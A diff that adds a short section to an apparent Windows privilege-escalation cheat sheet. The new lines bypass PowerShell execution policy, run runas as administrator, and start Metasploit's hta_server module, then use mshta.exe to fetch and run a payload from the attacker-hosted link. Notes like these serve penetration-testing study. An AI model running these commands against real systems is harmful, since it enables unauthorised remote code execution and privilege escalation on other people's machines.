@@ -118,3 +118,18 @@ getuid # The administrator acc
 
 ```
 
+## PowerShell command to bypass the default execution policy when running PowerShell scripts | PrivescCheck
+
+```bash
+# powershell -ep bypass .\script.ps1
+
+# runas.exe /user:administrator cmd
+
+### Kali
+use exploit/windows/misc/hta_server
+exploit
+
+# Copy the local link and execute on cmd  with mshta.exe
+mshta.exe http://link_generated_by_metasploit/hash
+
+```
